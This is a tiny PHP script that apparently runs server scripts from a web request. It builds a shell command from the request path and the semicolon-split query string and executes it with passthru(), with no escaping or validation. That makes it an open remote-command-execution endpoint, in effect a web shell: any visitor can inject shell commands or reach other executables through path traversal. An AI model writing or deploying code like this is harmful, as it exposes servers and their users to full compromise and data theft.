<?php
// s0.php/script?arguments [; separator]
header("Content-type: text/plain");

$qs=explode(';',$_SERVER['QUERY_STRING']);
//print_r($qs);
$script="/var/www/html".$_SERVER['PATH_INFO'];

$cmd=$script.' '.implode(" ",$qs);
//echo $cmd,"\n";
passthru($cmd);
?>
